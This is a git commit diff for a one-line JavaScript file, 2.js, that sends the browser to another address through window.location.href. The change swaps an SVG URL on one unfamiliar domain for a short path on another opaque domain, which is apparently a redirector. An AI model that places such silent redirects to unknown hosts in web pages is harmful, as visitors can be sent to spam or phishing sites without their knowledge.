b53afbb873f038fe45bda0dbeffe45a44b351dab
malcolms6 <151632134+malcolms6@users.noreply.github.com>
2023-11-29 21:00:46 +0800

    Update 2.js

--- 2.js
+++ 2.js
@@ -1,1 +1,1 @@
-window.location.href='http://file.tcm512.com/zcgjfile_170124144744006c1fbcd-377d-46ec-a07d-1646fc5f310f.svg?id=op6LW0MiK5y2g1jUsqACDSaOh38NIBHQ'
+window.location.href='http://s5.gszjzhgdjgpt.com./2479H'
